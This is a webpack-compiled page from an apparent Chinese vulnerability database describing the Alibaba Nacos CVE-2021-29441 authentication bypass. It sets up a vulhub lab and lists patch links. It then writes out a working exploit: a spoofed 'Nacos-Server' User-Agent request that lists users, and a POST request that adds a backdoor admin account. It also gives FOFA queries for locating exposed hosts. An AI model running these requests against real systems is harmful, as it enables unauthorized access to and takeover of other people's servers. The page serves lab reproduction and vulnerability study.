(window.webpackJsonp=window.webpackJsonp||[]).push([[134],{447:function(a,s,t){"use strict";t.r(s);var e=t(7),r=Object(e.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"💛-alibaba-nacos-未授权访问"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#💛-alibaba-nacos-未授权访问"}},[a._v("#")]),a._v(" 💛 Alibaba Nacos-未授权访问")]),a._v(" "),s("h2",{attrs:{id:"_1-漏洞信息"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-漏洞信息"}},[a._v("#")]),a._v(" 1）漏洞信息")]),a._v(" "),s("table",[s("thead",[s("tr",[s("th",[a._v("漏洞名称")]),a._v(" "),s("th",[a._v("受影响组件")]),a._v(" "),s("th",[a._v("漏洞类型")]),a._v(" "),s("th",[a._v("漏洞编号")])])]),a._v(" "),s("tbody",[s("tr",[s("td",[s("p",[a._v("阿里巴巴Nacos未授权访问")]),s("p",[a._v("阿里巴巴Nacos身份认证绕过")]),s("p",[a._v("阿里巴巴Nacos权限认证绕过")])]),a._v(" "),s("td",[s("a",{attrs:{href:"https://github.com/alibaba/nacos",target:"_blank",rel:"noopener noreferrer"}},[a._v("Alibaba Nacos"),s("OutboundLink")],1)]),a._v(" "),s("td",[a._v("未授权访问")]),a._v(" "),s("td",[s("a",{attrs:{href:"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29441",target:"_blank",rel:"noopener noreferrer"}},[a._v("CVE-2021-29441"),s("OutboundLink")],1)])])])]),a._v(" "),s("table",[s("thead",[s("tr",[s("th",[a._v("漏洞简介")])])]),a._v(" "),s("tbody",[s("tr",[s("td",[s("p",[a._v("nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。")]),s("p",[a._v("开发者原意是用来处理一些服务端对服务端的请求，但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，这就导致了漏洞的出现。并且利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息、可以添加登录账号并进入后台。")])])])])]),a._v(" "),s("table",[s("thead",[s("tr",[s("th",[a._v("参考链接")])])]),a._v(" "),s("tbody",[s("tr",[s("td",[s("ol",[s("li",[s("a",{attrs:{href:"https://github.com/vulhub/vulhub/blob/master/nacos/CVE-2021-29441/README.zh-cn.md",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://github.com/vulhub/vulhub/blob/master/nacos/CVE-2021-29441/README.zh-cn.md"),s("OutboundLink")],1)]),s("li",[s("a",{attrs:{href:"https://github.com/alibaba/nacos/issues/4701",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://github.com/alibaba/nacos/issues/4701"),s("OutboundLink")],1)]),s("li",[s("a",{attrs:{href:"https://github.com/alibaba/nacos/pull/4703",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://github.com/alibaba/nacos/pull/4703"),s("OutboundLink")],1)])])])])])]),a._v(" "),s("table",[s("thead",[s("tr",[s("th",[a._v("补丁或修复方案")])])]),a._v(" "),s("tbody",[s("tr",[s("td",[s("ol",[s("li",[a._v("（官方）"),s("a",{attrs:{href:"https://github.com/advisories/GHSA-36hp-jr8h-556f",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://github.com/advisories/GHSA-36hp-jr8h-556f"),s("OutboundLink")],1)]),s("li",[s("a",{attrs:{href:"https://nacos.io/zh-cn/docs/auth.html",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://nacos.io/zh-cn/docs/auth.html"),s("OutboundLink")],1)])])])])])]),a._v(" "),s("table",[s("thead",[s("tr",[s("th",[a._v("网络空间测绘")]),a._v(" "),s("th",[a._v("语法")])])]),a._v(" "),s("tbody",[s("tr",[s("td",[a._v("FOFA")]),a._v(" "),s("td",[s("code",[a._v('title="Nacos"')]),a._v(" "),s("br"),a._v(" "),s("code",[a._v('icon_hash="1227052603"')])])]),a._v(" "),s("tr",[s("td",[a._v("鹰图")]),a._v(" "),s("td",[s("code",[a._v('web.title="Nacos"')]),a._v(" "),s("br"),a._v(" "),s("code",[a._v('web.icon="???"')])])])])]),a._v(" "),s("h2",{attrs:{id:"_2-漏洞环境"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_2-漏洞环境"}},[a._v("#")]),a._v(" 2）漏洞环境")]),a._v(" "),s("p",[a._v("此处使用"),s("a",{attrs:{href:"https://github.com/vulhub/vulhub",target:"_blank",rel:"noopener noreferrer"}},[a._v("vulhub"),s("OutboundLink")],1),a._v("搭建漏洞环境")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("git")]),a._v(" clone https://github.com/vulhub/vulhub\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("cd")]),a._v(" vulhub/nacos/CVE-2021-29441\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("docker-compose")]),a._v(" up "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-d")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br")])]),s("p",[a._v("启动环境后，访问8848端口即可看到Nacos页面\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/alibaba-nacos/cve-2021-29441/01.png",alt:""}})]),a._v(" "),s("h2",{attrs:{id:"_3-漏洞复现-手工"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_3-漏洞复现-手工"}},[a._v("#")]),a._v(" 3）漏洞复现-手工")]),a._v(" "),s("p",[a._v("访问以下路径，应用程序提示403未授权")]),a._v(" "),s("div",{staticClass:"language-url line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-url"}},[s("code",[s("span",{pre:!0,attrs:{class:"token path"}},[s("span",{pre:!0,attrs:{class:"token path-separator"}},[a._v("/")]),a._v("nacos"),s("span",{pre:!0,attrs:{class:"token path-separator"}},[a._v("/")]),a._v("v1"),s("span",{pre:!0,attrs:{class:"token path-separator"}},[a._v("/")]),a._v("auth"),s("span",{pre:!0,attrs:{class:"token path-separator"}},[a._v("/")]),a._v("users")]),s("span",{pre:!0,attrs:{class:"token query"}},[s("span",{pre:!0,attrs:{class:"token query-delimiter"}},[a._v("?")]),s("span",{pre:!0,attrs:{class:"token pair"}},[s("span",{pre:!0,attrs:{class:"token key"}},[a._v("pageNo")]),a._v("="),s("span",{pre:!0,attrs:{class:"token value"}},[a._v("1")])]),s("span",{pre:!0,attrs:{class:"token pair-delimiter"}},[a._v("&")]),s("span",{pre:!0,attrs:{class:"token pair"}},[s("span",{pre:!0,attrs:{class:"token key"}},[a._v("pageSize")]),a._v("="),s("span",{pre:!0,attrs:{class:"token value"}},[a._v("10")])])]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/alibaba-nacos/cve-2021-29441/02.png",alt:""}}),a._v(" "),s("p",[a._v("修改"),s("code",[a._v("User-Agent")]),a._v("为"),s("code",[a._v("Nacos-Server")]),a._v("，刷新页面，成功以未授权状态访问接口")]),a._v(" "),s("p",[a._v("该接口列出了Nacos所有的用户名和加密后的密码")]),a._v(" "),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/alibaba-nacos/cve-2021-29441/03.png",alt:""}}),a._v(" "),s("p",[a._v("修改请求方式为"),s("code",[a._v("POST")])]),a._v(" "),s("p",[a._v("修改参数为"),s("code",[a._v("?username=<用户名>&password=<密码>")])]),a._v(" "),s("div",{staticClass:"language-http line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-http"}},[s("code",[s("span",{pre:!0,attrs:{class:"token request-line"}},[s("span",{pre:!0,attrs:{class:"token method property"}},[a._v("POST")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token request-target url"}},[s("span",{pre:!0,attrs:{class:"token path"}},[s("span",{pre:!0,attrs:{class:"token path-separator"}},[a._v("/")]),a._v("nacos"),s("span",{pre:!0,attrs:{class:"token path-separator"}},[a._v("/")]),a._v("v1"),s("span",{pre:!0,attrs:{class:"token path-separator"}},[a._v("/")]),a._v("auth"),s("span",{pre:!0,attrs:{class:"token path-separator"}},[a._v("/")]),a._v("users")]),s("span",{pre:!0,attrs:{class:"token query"}},[s("span",{pre:!0,attrs:{class:"token query-delimiter"}},[a._v("?")]),s("span",{pre:!0,attrs:{class:"token pair"}},[s("span",{pre:!0,attrs:{class:"token key"}},[a._v("username")]),a._v("="),s("span",{pre:!0,attrs:{class:"token value"}},[a._v("hello")])]),s("span",{pre:!0,attrs:{class:"token pair-delimiter"}},[a._v("&")]),s("span",{pre:!0,attrs:{class:"token pair"}},[s("span",{pre:!0,attrs:{class:"token key"}},[a._v("password")]),a._v("="),s("span",{pre:!0,attrs:{class:"token value"}},[a._v("123456a!")])])])]),a._v(" "),s("span",{pre:!0,attrs:{class:"token http-version property"}},[a._v("HTTP/1.1")])]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token header"}},[s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Host")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("192.168.80.132:8848")])]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token header"}},[s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("User-Agent")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("Nacos-Server")])]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token header"}},[s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Accept-Encoding")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("gzip, deflate, br")])]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token header"}},[s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Accept")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("*/*")])]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token header"}},[s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Connection")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("close")])]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token header"}},[s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Content-Type")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("application/x-www-form-urlencoded")])]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token header"}},[s("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Content-Length")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("0")])]),a._v("\n\n\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br"),s("span",{staticClass:"line-number"},[a._v("8")]),s("br"),s("span",{staticClass:"line-number"},[a._v("9")]),s("br"),s("span",{staticClass:"line-number"},[a._v("10")]),s("br")])]),s("p",[a._v("发送请求后，如果应用程序返回以下信息，说明用户添加成功\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/alibaba-nacos/cve-2021-29441/04.png",alt:""}})]),a._v(" "),s("p",[a._v("再次查看用户列表，可以看到用户名 hello\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/alibaba-nacos/cve-2021-29441/05.png",alt:""}})]),a._v(" "),s("p",[a._v("访问登录页面，输入刚刚添加的 用户名和密码，点击 “提交”\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/alibaba-nacos/cve-2021-29441/06.png",alt:""}})]),a._v(" "),s("p",[a._v("成功登录Nacos管理页面\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/alibaba-nacos/cve-2021-29441/07.png",alt:""}})]),a._v(" "),s("h2",{attrs:{id:"_4-漏洞复现-vulcat"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-漏洞复现-vulcat"}},[a._v("#")]),a._v(" 4）漏洞复现-vulcat")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("python3 vulcat.py "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),a._v("目标URL"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-v")]),a._v(" cve-2021-29441\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("由于添加Nacos后台用户是危险操作，所以vulcat只会通过列出用户列表 来检测漏洞是否存在")]),a._v(" "),s("p",[a._v("如果使用者想添加Nacos用户，则需要手动操作（也可以自行编写EXP）\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/alibaba-nacos/cve-2021-29441/08.png",alt:""}})])])}),[],!1,null,null,null);s.default=r.exports}}]);